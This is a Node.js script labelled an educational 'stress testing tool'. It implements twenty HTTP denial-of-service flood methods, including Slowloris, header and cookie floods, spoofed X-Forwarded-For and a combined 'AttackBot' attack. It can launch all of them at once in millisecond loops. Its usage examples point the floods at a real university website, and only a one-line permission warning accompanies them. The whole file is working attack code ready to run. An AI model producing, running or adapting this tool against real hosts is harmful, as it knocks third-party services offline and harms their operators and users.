#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const dgram = require('dgram');
const dns = require('dns');
const http = require('http');
const https = require('https');
const net = require('net');
const crypto = require('crypto');

class StressTester {
    constructor(target, options = {}) {
        this.target = target.replace(/^https?:\/\//, '').replace(/\/$/, '');
        this.port = options.port || 80;
        this.threads = options.threads || 1;
        this.duration = options.duration || 30000;
        this.running = false;
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            startTime: null,
            endTime: null
        };
    }

    getAllMethods() {
        return {
            http: {
                1: {
                    name: 'HTTP GET Flood',
                    description: 'Simple HTTP GET request flood',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.get({
                                hostname: target,
                                port: port,
                                path: '/',
                                timeout: 5000
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.get({
                            hostname: target,
                            port: port,
                            path: '/'
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.on('error', () => callback(false));
                    }
                },
                2: {
                    name: 'HTTP POST Flood',
                    description: 'HTTP POST request flood with data',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const postData = JSON.stringify({ test: 'data', timestamp: Date.now() });
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Content-Length': Buffer.byteLength(postData)
                                }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.write(postData);
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const postData = 'x'.repeat(1024);
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'POST',
                            headers: { 'Content-Length': postData.length }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.write(postData);
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                3: {
                    name: 'HTTP Random Parameters',
                    description: 'GET requests with random query parameters',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const randomId = Math.random().toString(36).substring(7);
                        return new Promise((resolve, reject) => {
                            const req = protocol.get({
                                hostname: target,
                                port: port,
                                path: `/?id=${randomId}&t=${Date.now()}`
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const randomId = Math.random().toString(36).substring(7);
                        const req = protocol.get({
                            hostname: target,
                            port: port,
                            path: `/?r=${randomId}`
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.on('error', () => callback(false));
                    }
                },
                4: {
                    name: 'HTTP Large Header Flood',
                    description: 'Requests with large custom headers',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: {
                                    'X-Custom': 'x'.repeat(2000),
                                    'X-Another': 'y'.repeat(2000)
                                }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'X-Flood': 'x'.repeat(4000) }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                5: {
                    name: 'HTTP Cookie Flood',
                    description: 'Requests with large cookies',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const largeCookie = 'session=' + 'x'.repeat(3000);
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Cookie': largeCookie }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Cookie': 'data=' + 'x'.repeat(4000) }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                6: {
                    name: 'HTTP Range Attack',
                    description: 'Requests with Range header',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Range': 'bytes=0-0,1-1,2-2' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Range': 'bytes=0-1000000' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                7: {
                    name: 'HTTP Referer Spam',
                    description: 'Requests with random referers',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const referers = ['google.com', 'facebook.com', 'twitter.com'];
                        const referer = referers[Math.floor(Math.random() * referers.length)];
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Referer': `https://${referer}` }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const randomReferer = 'https://' + Math.random().toString(36).substring(7) + '.com';
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Referer': randomReferer }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                8: {
                    name: 'HTTP User-Agent Flood',
                    description: 'Requests with random user agents',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const ua = 'Mozilla/5.0 (Windows NT 10.0; rv:' + Math.floor(Math.random() * 100) + '.0)';
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'User-Agent': ua }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const randomUA = 'Mozilla/5.0 (AttackBot/' + Math.random() + ')';
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'User-Agent': randomUA }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                9: {
                    name: 'HTTP Accept-Encoding Flood',
                    description: 'Requests with compression headers',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Accept-Encoding': 'gzip, deflate, br' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Accept-Encoding': 'gzip, deflate' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                10: {
                    name: 'HTTP Authorization Flood',
                    description: 'Requests with Basic Auth',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const auth = 'Basic ' + Buffer.from('admin:admin').toString('base64');
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Authorization': auth }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const auth = 'Basic ' + Buffer.from('user:pass' + Math.random()).toString('base64');
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Authorization': auth }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                11: {
                    name: 'HTTP X-Forwarded-For Flood',
                    description: 'Requests with spoofed IPs',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const spoofedIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'X-Forwarded-For': spoofedIP }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const fakeIP = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'X-Forwarded-For': fakeIP }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                12: {
                    name: 'HTTP Verb Flood',
                    description: 'Requests with random HTTP methods',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
                        const method = methods[Math.floor(Math.random() * methods.length)];
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: method
                            }, (res) => {
                                resolve({ status: res.statusCode, method: method });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
                        const method = methods[Math.floor(Math.random() * methods.length)];
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: method
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                13: {
                    name: 'HTTP Slowloris Style',
                    description: 'Slowloris attack simulation',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'GET'
                            });
                            setTimeout(() => {
                                req.destroy();
                                resolve({ slowloris: true });
                            }, 5000);
                            req.on('error', () => resolve({ slowloris: false }));
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'GET'
                        });
                        callback(true);
                    }
                },
                14: {
                    name: 'HTTP Chunked POST',
                    description: 'POST with chunked encoding',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'POST',
                                headers: { 'Transfer-Encoding': 'chunked' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.write('5\r\nHello\r\n');
                            req.write('0\r\n\r\n');
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'POST',
                            headers: { 'Transfer-Encoding': 'chunked' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.write('200\r\n' + 'x'.repeat(200) + '\r\n');
                        req.write('0\r\n\r\n');
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                15: {
                    name: 'HTTP Multipart Form Flood',
                    description: 'POST with multipart form data',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const boundary = '----' + crypto.randomBytes(8).toString('hex');
                        const body = `--${boundary}\r\nContent-Disposition: form-data\r\n\r\n${'x'.repeat(500)}\r\n--${boundary}--`;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'POST',
                                headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.write(body);
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const boundary = '----' + crypto.randomBytes(4).toString('hex');
                        const body = `--${boundary}\r\n\r\n${'x'.repeat(100)}\r\n--${boundary}--`;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'POST',
                            headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.write(body);
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                16: {
                    name: 'HTTP Pipeline Flood',
                    description: 'HTTP request pipelining',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'GET'
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            for (let i = 0; i < 5; i++) {
                                req.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
                            }
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'GET'
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        for (let i = 0; i < 3; i++) {
                            req.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
                        }
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                17: {
                    name: 'HTTP Expect Continue',
                    description: 'Requests with Expect: 100-continue',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                method: 'POST',
                                headers: { 'Expect': '100-continue', 'Content-Length': '10000' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.on('continue', () => {
                                req.write('x'.repeat(100));
                                req.end();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            method: 'POST',
                            headers: { 'Expect': '100-continue', 'Content-Length': '10000' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.on('continue', () => {
                            req.write('x'.repeat(50));
                            req.end();
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                18: {
                    name: 'HTTP If-Modified Flood',
                    description: 'Requests with If-Modified-Since header',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'If-Modified-Since': 'Wed, 21 Oct 2015 07:28:00 GMT' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'If-Modified-Since': 'Mon, 01 Jan 2000 00:00:00 GMT' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                19: {
                    name: 'HTTP Cache Control Flood',
                    description: 'Requests with cache control headers',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: '/',
                                headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate' }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: '/',
                            headers: { 'Cache-Control': 'no-cache' }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                },
                20: {
                    name: 'HTTP Mixed Attack',
                    description: 'Combines multiple attack vectors',
                    execute: async (target, port) => {
                        const protocol = port === 443 ? https : http;
                        const randomPath = '/' + Math.random().toString(36).substring(7);
                        const spoofedIP = '10.0.0.' + Math.floor(Math.random() * 255);
                        return new Promise((resolve, reject) => {
                            const req = protocol.request({
                                hostname: target,
                                port: port,
                                path: randomPath,
                                method: 'GET',
                                headers: {
                                    'X-Forwarded-For': spoofedIP,
                                    'User-Agent': 'AttackBot/1.0',
                                    'X-Custom': 'x'.repeat(500)
                                }
                            }, (res) => {
                                resolve({ status: res.statusCode });
                                req.destroy();
                            });
                            req.end();
                            req.on('error', reject);
                        });
                    },
                    flood: (target, port, callback) => {
                        const protocol = port === 443 ? https : http;
                        const randomPath = '/' + Math.random().toString(36).substring(7);
                        const req = protocol.request({
                            hostname: target,
                            port: port,
                            path: randomPath,
                            headers: {
                                'X-Forwarded-For': '10.0.0.' + Math.floor(Math.random() * 255),
                                'User-Agent': 'AttackBot/1.0'
                            }
                        }, (res) => {
                            res.resume();
                            req.destroy();
                            callback(true);
                        });
                        req.end();
                        req.on('error', () => callback(false));
                    }
                }
            }
        };
    }

    async runAllMethodsSimultaneously(category, duration) {
        const methods = this.getAllMethods();
        if (!methods[category]) {
            console.error(`\n❌ Category '${category}' not found!`);
            console.log(`Available categories: ${Object.keys(methods).join(', ')}`);
            return;
        }

        const categoryMethods = methods[category];
        const methodCount = Object.keys(categoryMethods).length;
        
        console.log('\n' + '='.repeat(70));
        console.log(`🚀 RUNNING ALL ${category.toUpperCase()} METHODS SIMULTANEOUSLY`);
        console.log('='.repeat(70));
        console.log(`📡 Target: ${this.target}:${this.port}`);
        console.log(`🔧 Methods: ${methodCount} methods (1-${methodCount})`);
        console.log(`🧵 Threads per method: ${this.threads}`);
        console.log(`⏱️  Duration: ${duration / 1000} seconds`);
        console.log(`📊 Total concurrent attacks: ${methodCount * this.threads}`);
        console.log('='.repeat(70) + '\n');

        this.running = true;
        this.stats.startTime = Date.now();
        
        // Store stats for each method
        const methodStats = {};
        const intervals = [];

        // Start all methods simultaneously
        for (let i = 1; i <= methodCount; i++) {
            const method = categoryMethods[i];
            if (!method || !method.flood) continue;

            methodStats[i] = {
                name: method.name,
                total: 0,
                success: 0,
                failed: 0
            };

            // Start flood for this method
            const interval = setInterval(() => {
                if (!this.running) return;
                
                for (let t = 0; t < this.threads; t++) {
                    method.flood(this.target, this.port, (success) => {
                        methodStats[i].total++;
                        if (success) {
                            methodStats[i].success++;
                            this.stats.success++;
                        } else {
                            methodStats[i].failed++;
                            this.stats.failed++;
                        }
                        this.stats.total++;
                    });
                }
            }, 1);
            
            intervals.push(interval);
        }

        // Display real-time stats
        const statsInterval = setInterval(() => {
            if (!this.running) return;
            
            console.clear();
            console.log('\n' + '='.repeat(70));
            console.log(`🔥 LIVE ATTACK STATS - ${category.toUpperCase()} (ALL ${methodCount} METHODS)`);
            console.log('='.repeat(70));
            console.log(`📡 Target: ${this.target}:${this.port}`);
            console.log(`⏱️  Elapsed: ${(Date.now() - this.stats.startTime) / 1000}s / ${duration / 1000}s`);
            console.log(`📊 Total Packets: ${this.stats.total}`);
            console.log(`✅ Total Success: ${this.stats.success}`);
            console.log(`❌ Total Failed: ${this.stats.failed}`);
            console.log(`📈 Total Rate: ${(this.stats.total / ((Date.now() - this.stats.startTime) / 1000)).toFixed(2)} packets/s`);
            console.log('='.repeat(70));
            console.log('\n📋 PER METHOD STATS:\n');
            
            for (const [num, stats] of Object.entries(methodStats)) {
                const elapsed = (Date.now() - this.stats.startTime) / 1000;
                const rate = stats.total / elapsed;
                const successRate = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
                console.log(`${num.padStart(2)}. ${stats.name.substring(0, 35).padEnd(35)} 📦:${stats.total} ✅:${stats.success} ❌:${stats.failed} 📈:${rate.toFixed(1)}/s (${successRate}%)`);
            }
            
            console.log('\n' + '='.repeat(70));
            console.log('Press Ctrl+C to stop early\n');
        }, 1000);

        // Stop after duration
        setTimeout(() => {
            this.running = false;
            clearInterval(statsInterval);
            intervals.forEach(interval => clearInterval(interval));
            this.stats.endTime = Date.now();
            
            this.printFinalResults(methodStats, category);
        }, duration);
    }

    printFinalResults(methodStats, category) {
        const elapsed = (this.stats.endTime - this.stats.startTime) / 1000;
        
        console.log('\n\n' + '='.repeat(70));
        console.log(`✅ FINAL RESULTS - ${category.toUpperCase()} (ALL METHODS SIMULTANEOUSLY)`);
        console.log('='.repeat(70));
        
        let totalPackets = 0;
        let totalSuccess = 0;
        let totalFailed = 0;
        
        for (const [num, stats] of Object.entries(methodStats)) {
            const rate = stats.total / elapsed;
            const successRate = stats.total > 0 ? ((stats.success / stats.total) * 100).toFixed(1) : 0;
            console.log(`\n${num}. ${stats.name}`);
            console.log(`   📦 Packets: ${stats.total}`);
            console.log(`   ✅ Success: ${stats.success}`);
            console.log(`   ❌ Failed: ${stats.failed}`);
            console.log(`   📈 Rate: ${rate.toFixed(2)} packets/s`);
            console.log(`   🎯 Success Rate: ${successRate}%`);
            
            totalPackets += stats.total;
            totalSuccess += stats.success;
            totalFailed += stats.failed;
        }
        
        console.log('\n' + '-'.repeat(70));
        console.log(`📊 COMBINED TOTALS:`);
        console.log(`   📦 Total Packets: ${totalPackets}`);
        console.log(`   ✅ Total Success: ${totalSuccess}`);
        console.log(`   ❌ Total Failed: ${totalFailed}`);
        console.log(`   🎯 Overall Success Rate: ${((totalSuccess / totalPackets) * 100).toFixed(2)}%`);
        console.log(`   ⏱️  Duration: ${elapsed.toFixed(2)}s`);
        console.log(`   📈 Overall Rate: ${(totalPackets / elapsed).toFixed(2)} packets/s`);
        console.log(`   🚀 Concurrent Methods: ${Object.keys(methodStats).length}`);
        console.log('='.repeat(70) + '\n');
    }

    async floodMethod(category, methodNumber, duration = this.duration) {
        const methods = this.getAllMethods();
        if (!methods[category] || !methods[category][methodNumber]) {
            console.error(`\n❌ Method ${category}/${methodNumber} not found!`);
            return;
        }

        const method = methods[category][methodNumber];
        if (!method.flood) {
            throw new Error(`Method ${category}/${methodNumber} has no flood implementation`);
        }

        this.running = true;
        this.stats.startTime = Date.now();
        
        console.log('\n' + '='.repeat(60));
        console.log(`🔥 STRESS TEST STARTED`);
        console.log('='.repeat(60));
        console.log(`📡 Target: ${this.target}:${this.port}`);
        console.log(`📂 Category: ${category.toUpperCase()}`);
        console.log(`🔧 Method: ${method.name}`);
        console.log(`🧵 Threads: ${this.threads}`);
        console.log(`⏱️  Duration: ${duration / 1000} seconds`);
        console.log('='.repeat(60) + '\n');

        const interval = setInterval(() => {
            for (let i = 0; i < this.threads; i++) {
                method.flood(this.target, this.port, (success) => {
                    this.stats.total++;
                    if (success) this.stats.success++;
                    else this.stats.failed++;
                    
                    if (this.stats.total % 100 === 0) {
                        const elapsed = (Date.now() - this.stats.startTime) / 1000;
                        const rate = this.stats.total / elapsed;
                        process.stdout.write(`\r📊 Packets: ${this.stats.total} | ✅: ${this.stats.success} | ❌: ${this.stats.failed} | 📈: ${rate.toFixed(2)}/s`);
                    }
                });
            }
        }, 1);

        setTimeout(() => {
            clearInterval(interval);
            this.running = false;
            this.stats.endTime = Date.now();
            const elapsed = (this.stats.endTime - this.stats.startTime) / 1000;
            const rate = this.stats.total / elapsed;
            
            console.log('\n\n' + '='.repeat(60));
            console.log(`✅ STRESS TEST COMPLETED`);
            console.log('='.repeat(60));
            console.log(`📊 Total Packets: ${this.stats.total}`);
            console.log(`✅ Successful: ${this.stats.success}`);
            console.log(`❌ Failed: ${this.stats.failed}`);
            console.log(`⏱️  Duration: ${elapsed.toFixed(2)}s`);
            console.log(`📈 Average Rate: ${rate.toFixed(2)} packets/s`);
            console.log(`🎯 Success Rate: ${((this.stats.success / this.stats.total) * 100).toFixed(2)}%`);
            console.log('='.repeat(60) + '\n');
        }, duration);
    }
}

function showHelp() {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║           STRESS TESTING TOOL - EDUCATIONAL PURPOSES          ║
╚═══════════════════════════════════════════════════════════════╝

USAGE:
  node script.js all <url> <category> [options]     # Run ALL methods SIMULTANEOUSLY
  node script.js flood <url> <category> <method> [options]  # Run single method
  node script.js list                               # List all methods

EXAMPLES:
  # Run ALL 20 HTTP methods SIMULTANEOUSLY on a site
  node script.js all https://usl.edu.ph http --duration 30 --threads 5 --port 443

  # Run ALL HTTP methods with 10 threads each
  node script.js all usl.edu.ph http --duration 60 --threads 10 --port 443

  # Run single method flood
  node script.js flood https://usl.edu.ph http 1 --duration 30 --threads 10 --port 443

OPTIONS FOR 'all' COMMAND:
  --duration <seconds>   Duration for ALL methods (default: 30 seconds)
  --threads <num>        Threads PER method (default: 5)
  --port <port>          Target port (default: 80)

WHAT 'all' DOES:
  - Launches ALL 20 HTTP methods at the SAME TIME
  - Each method runs with specified threads
  - Total concurrent connections = methods × threads
  - Real-time stats showing each method's performance
  - Complete final report with per-method breakdown

⚠️  WARNING: Only test systems you OWN or have PERMISSION to test!
`);
}

async function main() {
    const args = process.argv.slice(2);
    
    if (args.length === 0 || args[0] === 'help' || args[0] === '--help') {
        showHelp();
        return;
    }
    
    if (args[0] === 'list') {
        const tester = new StressTester('localhost');
        const methods = tester.getAllMethods();
        console.log("\n📚 AVAILABLE CATEGORIES & METHODS\n");
        for (const [category, cats] of Object.entries(methods)) {
            console.log(`📁 ${category.toUpperCase()} (${Object.keys(cats).length} methods)`);
            for (const [num, method] of Object.entries(cats)) {
                console.log(`   ${num}. ${method.name}`);
            }
            console.log();
        }
        return;
    }
    
    if (args[0] === 'all') {
        if (args.length < 3) {
            console.error('❌ Usage: node script.js all <url> <category> [options]');
            showHelp();
            return;
        }
        
        let url = args[1];
        const category = args[2];
        
        let duration = 30;
        let threads = 5;
        let port = 80;
        
        for (let i = 3; i < args.length; i++) {
            if (args[i] === '--duration' && args[i + 1]) {
                duration = parseInt(args[i + 1]);
                i++;
            } else if (args[i] === '--threads' && args[i + 1]) {
                threads = parseInt(args[i + 1]);
                i++;
            } else if (args[i] === '--port' && args[i + 1]) {
                port = parseInt(args[i + 1]);
                i++;
            }
        }
        
        url = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
        
        const tester = new StressTester(url, { 
            port: port, 
            threads: threads,
            duration: duration * 1000
        });
        
        await tester.runAllMethodsSimultaneously(category, duration * 1000);
        return;
    }
    
    if (args[0] === 'flood') {
        if (args.length < 4) {
            console.error('❌ Usage: node script.js flood <url> <category> <method> [options]');
            showHelp();
            return;
        }
        
        let url = args[1];
        const category = args[2];
        const method = parseInt(args[3]);
        
        let duration = 30;
        let threads = 1;
        let port = 80;
        
        for (let i = 4; i < args.length; i++) {
            if (args[i] === '--duration' && args[i + 1]) {
                duration = parseInt(args[i + 1]);
                i++;
            } else if (args[i] === '--threads' && args[i + 1]) {
                threads = parseInt(args[i + 1]);
                i++;
            } else if (args[i] === '--port' && args[i + 1]) {
                port = parseInt(args[i + 1]);
                i++;
            }
        }
        
        url = url.replace(/^https?:\/\//, '').replace(/\/$/, '');
        
        const tester = new StressTester(url, { 
            port: port, 
            threads: threads,
            duration: duration * 1000
        });
        
        await tester.floodMethod(category, method, duration * 1000);
        return;
    }
    
    console.error('❌ Unknown command:', args[0]);
    showHelp();
}

main().catch(console.error);